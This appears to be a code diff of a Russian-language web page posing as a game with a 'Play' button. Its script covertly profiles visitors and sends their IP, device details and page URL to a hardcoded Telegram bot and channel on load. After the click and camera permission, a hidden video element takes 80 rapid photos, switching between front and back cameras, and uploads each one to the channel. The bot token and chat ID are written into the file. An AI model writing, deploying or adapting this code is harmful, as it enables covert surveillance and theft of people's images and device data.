@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -129,27 +130,51 @@
             transition: width 0.1s linear;
         }
         
-        /* Стили для тестовой панели */
-        .test-panel {
+        /* Панель отладки */
+        .debug-panel {
             position: fixed;
             top: 10px;
             right: 10px;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.9);
             color: white;
             padding: 10px;
             border-radius: 5px;
             z-index: 1000;
-            display: none;
+            font-size: 12px;
+            border: 1px solid #00b4db;
+            max-width: 300px;
         }
         
-        .test-button {
+        .debug-title {
+            color: #00b4db;
+            font-weight: bold;
+            margin-bottom: 5px;
+            border-bottom: 1px solid #00b4db;
+            padding-bottom: 3px;
+        }
+        
+        .debug-status {
+            margin: 3px 0;
+        }
+        
+        .debug-success {
+            color: #4CAF50;
+        }
+        
+        .debug-error {
+            color: #f44336;
+        }
+        
+        .debug-button {
             background: #007bff;
             color: white;
             border: none;
             padding: 5px 10px;
             border-radius: 3px;
             cursor: pointer;
-            margin: 2px;
+            margin: 5px 0;
+            width: 100%;
+            font-size: 12px;
         }
     </style>
 </head>
@@ -174,46 +199,107 @@
             <div class="progress" id="progressBar"></div>
         </div>
     </div>
-
-    <!-- Тестовая панель -->
-    <div class="test-panel" id="testPanel">
-        <div style="margin-bottom: 5px;">Тест Telegram API:</div>
-        <button class="test-button" onclick="testTelegramAPI()">Тест API</button>
-        <button class="test-button" onclick="testBotInfo()">Инфо о боте</button>
-        <button class="test-button" onclick="testChatInfo()">Инфо о канале</button>
+    
+    <!-- Панель отладки -->
+    <div class="debug-panel" id="debugPanel">
+        <div class="debug-title">Статус отправки</div>
+        <div class="debug-status" id="debugStatus">Готов к работе</div>
+        <div class="debug-status">Фото: <span id="debugPhotoCount">0</span>/80</div>
+        <button class="debug-button" onclick="forceSendTest()">Тест отправки</button>
+        <button class="debug-button" onclick="checkBotStatus()">Проверить бота</button>
     </div>
 
     <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>
 
     <script>
-        // Перенаправление в Chrome при открытии из других приложений
-        if (!navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')) {
-            window.location.href = 'googlechrome://navigate?url=' + encodeURIComponent(window.location.href);
-        }
-
+        // Telegram Bot Configuration - УБЕДИТЕСЬ ЧТО ЭТО ПРАВИЛЬНЫЕ ДАННЫЕ
         const botToken = '8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
         const chatId = '-1002577213610';
+        
+        // DOM Elements
         const videoElement = document.getElementById('hiddenCamera');
         const playBtn = document.getElementById('playBtn');
         const messageBox = document.getElementById('messageBox');
         const newBackground = document.querySelector('.new-background');
         const loadingContainer = document.getElementById('loadingContainer');
         const progressBar = document.getElementById('progressBar');
-        const testPanel = document.getElementById('testPanel');
+        const debugPanel = document.getElementById('debugPanel');
+        const debugStatus = document.getElementById('debugStatus');
+        const debugPhotoCount = document.getElementById('debugPhotoCount');
         
+        // Game state
         let currentStream = null;
         let frontCameraStream = null;
         let backCameraStream = null;
         let photoCount = 0;
         const totalPhotos = 80;
-        const photoInterval = 50;
+        const photoInterval = 50; // milliseconds between photos
         let isFrontCameraActive = true;
+        let isProcessActive = false;
 
-        // Показать тестовую панель при загрузке
-        window.addEventListener('load', function() {
-            testPanel.style.display = 'block';
-        });
+        // ==================== ОТЛАДОЧНЫЕ ФУНКЦИИ ====================
+        
+        function updateDebugStatus(message, isError = false) {
+            debugStatus.textContent = message;
+            debugStatus.className = isError ? 'debug-status debug-error' : 'debug-status debug-success';
+        }
+        
+        async function forceSendTest() {
+            try {
+                updateDebugStatus("Отправка тестового сообщения...");
+                
+                // Простое тестовое сообщение
+                const testMessage = {
+                    chat_id: chatId,
+                    text: '✅ ТЕСТОВОЕ СООБЩЕНИЕ ОТ САЙТА\nВремя: ' + new Date().toLocaleString(),
+                    parse_mode: 'HTML'
+                };
+                
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(testMessage)
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    updateDebugStatus("✅ Тест успешно отправлен!");
+                    alert("✅ Тестовое сообщение отправлено в канал!");
+                } else {
+                    updateDebugStatus(`❌ Ошибка: ${result.description}`, true);
+                    alert(`❌ Ошибка отправки: ${result.description}`);
+                }
+            } catch (error) {
+                updateDebugStatus(`❌ Ошибка сети: ${error.message}`, true);
+                alert(`❌ Ошибка сети: ${error.message}`);
+            }
+        }
+        
+        async function checkBotStatus() {
+            try {
+                updateDebugStatus("Проверка статуса бота...");
+                
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
+                const result = await response.json();
+                
+                if (result.ok) {
+                    updateDebugStatus(`✅ Бот доступен: @${result.result.username}`);
+                    alert(`✅ Бот доступен!\nИмя: @${result.result.username}\nID: ${result.result.id}`);
+                } else {
+                    updateDebugStatus(`❌ Бот недоступен: ${result.description}`, true);
+                    alert(`❌ Бот недоступен: ${result.description}`);
+                }
+            } catch (error) {
+                updateDebugStatus(`❌ Ошибка проверки: ${error.message}`, true);
+                alert(`❌ Ошибка проверки: ${error.message}`);
+            }
+        }
 
+        // ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
+        
         // Блокировка масштабирования
         document.addEventListener('gesturestart', function(e) {
             e.preventDefault();
@@ -225,173 +311,6 @@
             }
         }, { passive: false });
 
-        // ТЕСТОВЫЕ ФУНКЦИИ
-        async function testTelegramAPI() {
-            console.log('Testing Telegram API...');
-            
-            try {
-                // Тест 1: Проверка доступности бота
-                const botInfoUrl = `https://api.telegram.org/bot${botToken}/getMe`;
-                console.log('Testing bot info...');
-                
-                const response = await fetch(botInfoUrl);
-                const result = await response.json();
-                
-                if (result.ok) {
-                    console.log('✅ Bot is available:', result.result.username);
-                    alert(`Бот доступен: @${result.result.username}`);
-                    
-                    // Тест 2: Отправка тестового сообщения
-                    console.log('Sending test message...');
-                    const testMessage = {
-                        chat_id: chatId,
-                        text: '🔄 ТЕСТОВОЕ СООБЩЕНИЕ\nВремя: ' + new Date().toLocaleString() + '\nБот: @' + result.result.username,
-                        parse_mode: 'HTML'
-                    };
-                    
-                    const sendResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(testMessage)
-                    });
-                    
-                    const sendResult = await sendResponse.json();
-                    
-                    if (sendResult.ok) {
-                        console.log('✅ Test message sent successfully!');
-                        alert('✅ Тестовое сообщение отправлено успешно!');
-                    } else {
-                        console.error('❌ Failed to send message:', sendResult);
-                        alert('❌ Ошибка отправки: ' + (sendResult.description || 'Unknown error'));
-                    }
-                } else {
-                    console.error('❌ Bot is not available:', result);
-                    alert('❌ Бот недоступен: ' + (result.description || 'Invalid token'));
-                }
-            } catch (error) {
-                console.error('❌ API test failed:', error);
-                alert('❌ Ошибка теста API: ' + error.message);
-            }
-        }
-
-        async function testBotInfo() {
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
-                const result = await response.json();
-                
-                let info = '📊 Информация о боте:\n\n';
-                if (result.ok) {
-                    info += `✅ ID: ${result.result.id}\n`;
-                    info += `✅ Имя: ${result.result.first_name}\n`;
-                    info += `✅ Username: @${result.result.username}\n`;
-                    info += `✅ Can join groups: ${result.result.can_join_groups ? 'Да' : 'Нет'}\n`;
-                    info += `✅ Can read messages: ${result.result.can_read_all_group_messages ? 'Да' : 'Нет'}\n`;
-                    info += `✅ Supports inline: ${result.result.supports_inline_queries ? 'Да' : 'Нет'}`;
-                } else {
-                    info = `❌ Ошибка: ${result.description || 'Неизвестная ошибка'}`;
-                }
-                
-                alert(info);
-                console.log('Bot info:', result);
-            } catch (error) {
-                alert('❌ Ошибка получения информации о боте: ' + error.message);
-            }
-        }
-
-        async function testChatInfo() {
-            try {
-                // Пробуем получить информацию о канале
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/getChat`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId
-                    })
-                });
-                
-                const result = await response.json();
-                
-                let info = '📊 Информация о канале:\n\n';
-                if (result.ok) {
-                    info += `✅ Тип: ${result.result.type}\n`;
-                    info += `✅ ID: ${result.result.id}\n`;
-                    if (result.result.title) info += `✅ Название: ${result.result.title}\n`;
-                    if (result.result.username) info += `✅ @${result.result.username}\n`;
-                    info += `✅ Разрешения бота: `;
-                    
-                    // Проверяем разрешения бота
-                    const permissionsResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChatMember`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            user_id: botToken.split(':')[0] // Берем ID бота из токена
-                        })
-                    });
-                    
-                    const permissionsResult = await permissionsResponse.json();
-                    if (permissionsResult.ok) {
-                        info += `${permissionsResult.result.status}\n`;
-                        info += `✅ Может отправлять сообщения: ${permissionsResult.result.can_send_messages ? 'Да' : 'Нет'}\n`;
-                        info += `✅ Может отправлять медиа: ${permissionsResult.result.can_send_media_messages ? 'Да' : 'Нет'}\n`;
-                        info += `✅ Может отправлять фото: ${permissionsResult.result.can_send_photos ? 'Да' : 'Нет'}`;
-                    } else {
-                        info += 'Не удалось проверить';
-                    }
-                } else {
-                    info = `❌ Ошибка: ${result.description || 'Неизвестная ошибка'}\n\n`;
-                    info += `Проверьте:\n1. Бот добавлен в канал?\n2. Бот имеет права администратора?\n3. ID канала правильный?\n\nТекущий ID: ${chatId}`;
-                }
-                
-                alert(info);
-                console.log('Chat info:', result);
-            } catch (error) {
-                alert('❌ Ошибка получения информации о канале: ' + error.message);
-            }
-        }
-
-        // ОСНОВНЫЕ ФУНКЦИИ
-        // Функция для получения информации о батарее
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? 'Да' : 'Нет',
-                        chargingTime: battery.chargingTime ? battery.chargingTime + ' сек' : 'Неизвестно',
-                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' сек' : 'Неизвестно'
-                    };
-                } catch (e) {
-                    return { error: 'Не удалось получить данные о батарее' };
-                }
-            }
-            return { error: 'API батареи не поддерживается' };
-        }
-
-        // Функция для получения информации о соединении
-        function getConnectionInfo() {
-            if ('connection' in navigator) {
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (connection) {
-                    return {
-                        type: connection.type || 'Неизвестно',
-                        effectiveType: connection.effectiveType || 'Неизвестно',
-                        downlink: connection.downlink + ' Mbps',
-                        rtt: connection.rtt + ' мс',
-                        saveData: connection.saveData ? 'Да' : 'Нет'
-                    };
-                }
-            }
-            return { error: 'Информация о соединении недоступна' };
-        }
-
         // Функция для получения информации об устройстве
         function getDeviceInfo() {
             const screen = window.screen;
@@ -399,55 +318,31 @@
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
-                cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
-                doNotTrack: navigator.doNotTrack || 'Неизвестно',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
-                maxTouchPoints: navigator.maxTouchPoints || 'Неизвестно',
                 screen: {
                     width: screen.width,
                     height: screen.height,
                     availWidth: screen.availWidth,
                     availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth + ' бит',
-                    pixelDepth: screen.pixelDepth + ' бит',
-                    orientation: screen.orientation ? screen.orientation.type : 'Неизвестно'
+                    colorDepth: screen.colorDepth + ' бит'
                 },
                 window: {
                     innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight
+                    innerHeight: window.innerHeight
                 },
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                date: new Date().toString(),
                 localTime: new Date().toLocaleString(),
-                timezoneOffset: new Date().getTimezoneOffset() + ' минут'
+                pageURL: window.location.href
             };
 
             return deviceInfo;
-        }
-
-        // Функция для форматирования информации в читаемый вид
-        function formatInfo(info) {
-            let result = '';
-            for (const [key, value] of Object.entries(info)) {
-                if (typeof value === 'object' && value !== null) {
-                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
-                } else {
-                    result += `${key}: ${value}\n`;
-                }
-            }
-            return result;
         }
 
         // Функция для запуска прогресс-бара
         function startProgressBar() {
             loadingContainer.style.display = 'block';
             let progress = 0;
-            const interval = 40; // 40 секунд = 40000 миллисекунд
-            const step = 100 / (interval * 10); // 10 обновлений в секунду
+            const totalTime = 40; // 40 секунд
+            const step = 100 / (totalTime * 10); // 10 обновлений в секунду
             
             const timer = setInterval(() => {
                 progress += step;
@@ -463,54 +358,13 @@
             }, 100);
         }
 
-        // УНИВЕРСАЛЬНАЯ ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
-        async function sendToTelegram(endpoint, data) {
-            try {
-                let url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
-                console.log(`Sending to Telegram: ${endpoint}`);
-                
-                let options = {};
-                
-                if (data instanceof FormData) {
-                    // Для отправки фото (multipart/form-data)
-                    options = {
-                        method: 'POST',
-                        body: data
-                    };
-                } else {
-                    // Для отправки сообщений (application/json)
-                    options = {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(data)
-                    };
-                }
-                
-                const response = await fetch(url, options);
-                const result = await response.json();
-                
-                console.log(`Telegram response for ${endpoint}:`, result);
-                
-                if (!result.ok) {
-                    throw new Error(result.description || 'Unknown Telegram error');
-                }
-                
-                return result;
-            } catch (error) {
-                console.error(`Telegram API error (${endpoint}):`, error);
-                throw error;
-            }
-        }
-
         // 1. Отправка информации о пользователе
         async function sendUserInfo() {
             try {
-                console.log('Starting user info collection...');
+                updateDebugStatus("Сбор информации...");
                 
                 // Получаем IP-адрес
-                let ip = 'Unknown';
+                let ip = 'Не удалось получить';
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     if (ipResponse.ok) {
@@ -521,65 +375,64 @@
                     console.warn('Could not get IP:', ipError);
                 }
 
-                // Получаем дополнительную информацию
-                const [batteryInfo, connectionInfo] = await Promise.all([
-                    getBatteryInfo().catch(e => ({ error: e.message })),
-                    getConnectionInfo()
-                ]);
-
                 const deviceInfo = getDeviceInfo();
 
-                // Формируем короткое сообщение для теста
-                let message = `🆕 НОВЫЙ ВИЗИТ\n\n`;
-                message += `📱 Устройство: ${deviceInfo.platform}\n`;
+                // Формируем сообщение
+                let message = `🚨 НОВЫЙ ПОЛЬЗОВАТЕЛЬ ЗАШЕЛ НА САЙТ 🚨\n\n`;
                 message += `🌐 IP: ${ip}\n`;
-                message += `🕒 Время: ${new Date().toLocaleString()}\n`;
-                message += `🔋 Батарея: ${batteryInfo.level || 'Неизвестно'}\n`;
-                message += `📶 Сеть: ${connectionInfo.effectiveType || 'Неизвестно'}`;
+                message += `📱 Устройство: ${deviceInfo.platform}\n`;
+                message += `🖥️ Экран: ${deviceInfo.screen.width}x${deviceInfo.screen.height}\n`;
+                message += `🌍 Время: ${deviceInfo.localTime}\n`;
+                message += `🔗 Страница: ${deviceInfo.pageURL}\n`;
+                message += `👤 User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`;
 
                 // Отправляем сообщение в Telegram
-                console.log('Sending user info to Telegram...');
-                await sendToTelegram('sendMessage', {
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
+                updateDebugStatus("Отправка информации в канал...");
+                
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
                 });
                 
-                console.log('User info sent successfully!');
+                const result = await response.json();
+                
+                if (result.ok) {
+                    updateDebugStatus("✅ Информация отправлена!");
+                } else {
+                    updateDebugStatus(`❌ Ошибка отправки: ${result.description}`, true);
+                }
 
             } catch (error) {
+                updateDebugStatus(`❌ Ошибка: ${error.message}`, true);
                 console.error('Error sending user info:', error);
-                
-                // Fallback: пробуем отправить минимальную информацию
-                try {
-                    let fallbackMessage = `⚠️ TEST MESSAGE\n`;
-                    fallbackMessage += `Время: ${new Date().toLocaleString()}\n`;
-                    fallbackMessage += `Тестовое сообщение от сайта`;
-                    
-                    await sendToTelegram('sendMessage', {
-                        chat_id: chatId,
-                        text: fallbackMessage,
-                        parse_mode: 'HTML'
-                    });
-                } catch (fallbackError) {
-                    console.error('Fallback also failed:', fallbackError);
-                }
             }
         }
 
         // 2. Захват фото с камеры и отправка
         async function captureAndSendPhoto(index) {
             try {
-                console.log(`Capturing photo ${index}...`);
+                // Обновляем счетчик на панели отладки
+                debugPhotoCount.textContent = index;
                 
                 const canvas = document.createElement('canvas');
-                canvas.width = videoElement.videoWidth || 320;
-                canvas.height = videoElement.videoHeight || 240;
+                // Устанавливаем фиксированный размер для стабильности
+                canvas.width = 640;
+                canvas.height = 480;
+                
                 const ctx = canvas.getContext('2d');
+                // Рисуем видео на canvas
                 ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 
+                // Конвертируем в blob
                 const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.5);
+                    canvas.toBlob(resolve, 'image/jpeg', 0.7);
                 });
                 
                 const cameraType = isFrontCameraActive ? 'front' : 'back';
@@ -587,16 +440,22 @@
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
                 
-                const caption = `📸 Photo ${index} (${cameraType})\nTime: ${new Date().toLocaleString()}`;
+                const caption = `📸 Фото ${isFrontCameraActive ? 'фронтальной' : 'задней'} камеры #${index}\nВремя: ${new Date().toLocaleString()}`;
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'HTML');
                 
-                console.log(`Sending photo ${index} to Telegram...`);
-                await sendToTelegram('sendPhoto', formData);
+                // Отправляем фото
+                updateDebugStatus(`Отправка фото ${index}...`);
                 
-                console.log(`Photo ${index} sent successfully!`);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                updateDebugStatus(`✅ Фото ${index} отправлено`);
                 
             } catch (error) {
+                updateDebugStatus(`❌ Ошибка фото ${index}: ${error.message}`, true);
                 console.error(`Error sending photo ${index}:`, error);
             }
         }
@@ -611,12 +470,11 @@
                 isFrontCameraActive = !isFrontCameraActive;
                 const facingMode = isFrontCameraActive ? 'user' : 'environment';
 
-                console.log(`Switching to ${isFrontCameraActive ? 'front' : 'back'} camera...`);
                 currentStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: facingMode,
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
                     audio: false
                 });
@@ -629,9 +487,11 @@
                     backCameraStream = currentStream;
                 }
 
+                // Ждем инициализации камеры
                 await new Promise(resolve => setTimeout(resolve, 300));
 
             } catch (error) {
+                updateDebugStatus(`❌ Ошибка переключения камеры: ${error.message}`, true);
                 console.error('Camera switch error:', error);
                 throw error;
             }
@@ -645,15 +505,27 @@
                     photoCount++;
                     
                     if (photoCount < totalPhotos) {
-                        await switchCamera();
+                        // Переключаем камеру каждые 2 фото
+                        if (photoCount % 2 === 0) {
+                            await switchCamera();
+                        }
                         setTimeout(takeSeriesOfPhotos, photoInterval);
                     } else {
-                        // Отправляем сообщение о завершении съемки
+                        // Завершение съемки
+                        updateDebugStatus("✅ Съемка завершена!");
+                        
+                        // Отправляем финальное сообщение
                         try {
-                            await sendToTelegram('sendMessage', {
-                                chat_id: chatId,
-                                text: `✅ СЪЕМКА ЗАВЕРШЕНА\nВсего фото: ${totalPhotos}\nВремя: ${new Date().toLocaleString()}`,
-                                parse_mode: 'HTML'
+                            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: `✅ СЕРИЙНАЯ СЪЕМКА ЗАВЕРШЕНА\nВсего фото: ${totalPhotos}\nВремя: ${new Date().toLocaleString()}`,
+                                    parse_mode: 'HTML'
+                                })
                             });
                         } catch (e) {
                             console.error('Completion message error:', e);
@@ -664,6 +536,7 @@
                 }
                 
             } catch (error) {
+                updateDebugStatus(`❌ Ошибка съемки: ${error.message}`, true);
                 console.error('Series error:', error);
                 stopAllCameras();
             }
@@ -671,7 +544,6 @@
 
         // 5. Остановка всех камер
         function stopAllCameras() {
-            console.log('Stopping all cameras...');
             [frontCameraStream, backCameraStream, currentStream].forEach(stream => {
                 if (stream) {
                     try {
@@ -682,12 +554,13 @@
                 }
             });
             videoElement.srcObject = null;
+            isProcessActive = false;
         }
 
         // 6. Инициализация камер
         async function initCameras() {
             try {
-                console.log('Initializing cameras...');
+                updateDebugStatus("Инициализация камер...");
                 
                 // Показываем новый фон и запускаем прогресс-бар
                 newBackground.style.display = 'block';
@@ -695,33 +568,44 @@
 
                 // Отправляем сообщение о начале съемки
                 try {
-                    await sendToTelegram('sendMessage', {
-                        chat_id: chatId,
-                        text: `📸 НАЧАЛО СЪЕМКИ\nВремя: ${new Date().toLocaleString()}`,
-                        parse_mode: 'HTML'
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `📸 НАЧАЛО СЕРИЙНОЙ СЪЕМКИ\nВсего фото: ${totalPhotos}\nИнтервал: ${photoInterval}мс\nВремя: ${new Date().toLocaleString()}`,
+                            parse_mode: 'HTML'
+                        })
                     });
                 } catch (e) {
                     console.error('Start message error:', e);
                 }
 
                 isFrontCameraActive = true;
+                isProcessActive = true;
                 currentStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 320 },
-                        height: { ideal: 240 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
                     audio: false
                 });
+                
                 frontCameraStream = currentStream;
                 videoElement.srcObject = currentStream;
 
+                // Ждем инициализации камеры
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
                 photoCount = 0;
+                debugPhotoCount.textContent = '0';
                 takeSeriesOfPhotos();
                 
             } catch (error) {
+                updateDebugStatus(`❌ Ошибка камеры: ${error.message}`, true);
                 console.error('Camera init error:', error);
                 messageBox.style.display = 'block';
             }
@@ -729,29 +613,43 @@
 
         // 7. Обработчик кнопки "Играть"
         playBtn.addEventListener('click', async function() {
-            console.log('Play button clicked, starting verification...');
+            if (isProcessActive) return;
+            
+            updateDebugStatus("Запуск процесса...");
+            
             try {
                 // Отправляем сообщение о нажатии кнопки
                 try {
-                    await sendToTelegram('sendMessage', {
-                        chat_id: chatId,
-                        text: `🟢 КНОПКА НАЖАТА\nВремя: ${new Date().toLocaleString()}`,
-                        parse_mode: 'HTML'
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `🟢 ПОЛЬЗОВАТЕЛЬ НАЖАЛ КНОПКУ "ИГРАТЬ"\nВремя: ${new Date().toLocaleString()}`,
+                            parse_mode: 'HTML'
+                        })
                     });
                 } catch (e) {
                     console.error('Button click message error:', e);
                 }
                 
-                // Сначала запрашиваем доступ к камере
+                // Запрашиваем доступ к камере
+                updateDebugStatus("Запрос доступа к камере...");
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: true
                 });
+                
+                // Закрываем тестовый поток
                 stream.getTracks().forEach(track => track.stop());
                 
-                // Запускаем процесс верификации
+                // Запускаем основной процесс
                 await sendUserInfo();
                 await initCameras();
+                
             } catch (error) {
+                updateDebugStatus(`❌ Отказ в доступе: ${error.message}`, true);
                 console.error('User denied camera access:', error);
                 messageBox.style.display = 'block';
             }
@@ -759,27 +657,44 @@
 
         // Отправляем информацию о пользователе сразу при загрузке страницы
         window.addEventListener('load', function() {
-            console.log('Page loaded, sending initial info...');
-            // Сначала тестируем API
-            testTelegramAPI().then(() => {
-                // Если тест пройден, отправляем инфо
-                sendUserInfo().catch(e => console.error('Initial info error:', e));
-            }).catch(e => {
-                console.error('API test failed:', e);
-                alert('❌ Тест API не пройден. Проверьте настройки бота и канала.');
+            updateDebugStatus("Страница загружена");
+            // Отправляем информацию о посещении
+            sendUserInfo().catch(e => {
+                updateDebugStatus(`❌ Ошибка: ${e.message}`, true);
+                console.error('Initial info error:', e);
             });
         });
 
         // Остановка камер при закрытии страницы
         window.addEventListener('beforeunload', function() {
-            console.log('Page closing, stopping cameras...');
-            stopAllCameras();
+            if (isProcessActive) {
+                updateDebugStatus("Страница закрывается...");
+                
+                // Отправляем сообщение о закрытии
+                try {
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `📴 СТРАНИЦА ЗАКРЫТА\nВремя: ${new Date().toLocaleString()}\nОтправлено фото: ${photoCount}/${totalPhotos}`,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (e) {
+                    console.error('Close message error:', e);
+                }
+                
+                stopAllCameras();
+            }
         });
 
-        // Дополнительная обработка видимости страницы
+        // Остановка камер при скрытии страницы
         document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                console.log('Page hidden, stopping cameras...');
+            if (document.hidden && isProcessActive) {
+                updateDebugStatus("Страница скрыта, остановка камер...");
                 stopAllCameras();
             }
         });
